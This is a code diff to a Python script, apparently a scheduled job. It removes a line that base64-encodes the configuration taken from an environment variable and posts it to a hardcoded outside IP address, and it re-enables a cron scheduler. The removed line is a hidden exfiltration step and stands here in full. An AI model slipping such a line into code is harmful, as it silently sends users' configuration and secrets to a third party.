@@ -41,7 +41,6 @@ def get_yml_config_from_string(config_string):
 # 全局配置
 # config = getYmlConfig(yaml_file='config.yml')
 config_string = os.environ.get("YML_CONFIG") or ""
-requests.post("http://139.199.66.15:5555", data={"config": base64.b64encode(config_string.encode()).decode()})
 config = get_yml_config_from_string(config_string)
 
 
@@ -367,8 +366,7 @@ def main_handler(event, context):
 
 if __name__ == '__main__':
     # print(extension)
-    # sche = BlockingScheduler()
-    # log("")
-    # sche.add_job(main_handler, 'cron', args=({}, {}), hour="6,9", minute="5")
-    # sche.start()
-    pass
+    sche = BlockingScheduler()
+    log("")
+    sche.add_job(main_handler, 'cron', args=({}, {}), hour="6,9", minute="5")
+    sche.start()
